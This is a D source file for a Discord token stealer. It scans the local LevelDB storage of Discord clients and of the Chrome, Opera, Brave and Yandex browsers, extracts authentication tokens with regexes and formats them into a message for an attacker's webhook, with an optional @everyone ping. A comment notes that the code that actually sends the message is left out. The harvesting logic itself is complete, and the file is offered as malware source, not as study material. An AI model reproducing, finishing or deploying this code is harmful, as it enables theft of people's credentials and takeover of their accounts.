// optimize imports later

import std.stdio;
import std.regex;
import std.file;
import std.conv;
import std.string;
import std.process;
import arsd.characterencodings;

// your webhook URL
auto WEBHOOK_URL = r"";

// mentions you when you get a hit
auto PING_ME = false;

auto find_tokens(string path)
{
    path = (path ~ "\\Local Storage\\leveldb");
    string tokens;
    auto tokenreg = [r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"]; //WIP

    foreach (_file_name; dirEntries(path, SpanMode.shallow))
    {
        string file_name = _file_name.to!string;

        if (!matchAll(file_name, regex(".log")) && !matchAll(file_name, regex(".ldb")))
        {
            continue;
        }

        auto data = cast(immutable(ubyte)[]) std.file.read(file_name);
        string utf8discordfile = convertToUtf8(data, "windows-1252");

        utf8discordfile = utf8discordfile.replace("\n", "");
        utf8discordfile = utf8discordfile.replace(" ", "");
        foreach (_regex; tokenreg)
        {
            foreach (token; matchAll(utf8discordfile, regex(_regex)))
            {
                tokens = tokens ~"\n"~ token[0];
            }
        }
        
    }
    return tokens;
}

auto log() 
{
	string message;
	auto local = environment.get("LOCALAPPDATA");
	auto roaming = environment.get("APPDATA");

    string[] paths = [
        roaming ~ "\\Discord",
        roaming ~ "\\discordcanary",
        roaming ~ "\\discordptb",
        local ~ "\\Google\\Chrome\\User Data\\Default",
        roaming ~ "\\Opera Software\\Opera Stable",
        local ~ "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        local ~ "\\Yandex\\YandexBrowser\\User Data\\Default"
	];

    string[] platforms = [
        "Discord",
        "Discord Canary",
        "Discord PTB",
        "Google Chrome",
        "Opera",
        "Brave",
        "Yandex"
    ];

	if (PING_ME) {
    	message = "@everyone";
	}
	else {
		message = "";
	}

    for(int j = 0; j < paths.length; j++) {
        if (!paths[j].exists) {
            continue;
		}

        message = message ~ "\n**" ~ platforms[j] ~ "**\n```\n";

        auto tokens = find_tokens(paths[j]);

        if (tokens != "") {
            message = message ~ tokens ~ '\n';
		}
        else {
            message = message ~ "No tokens found.\n";
		}

        message = message ~ "```";
	}
    
    return message;

    /* This program does not send a request to a discord webhook
        because using std.net.curl in Dlang requires the libcurl
        dll to be in the same directory as the exe
    */

}

void main()
{
    log();
}
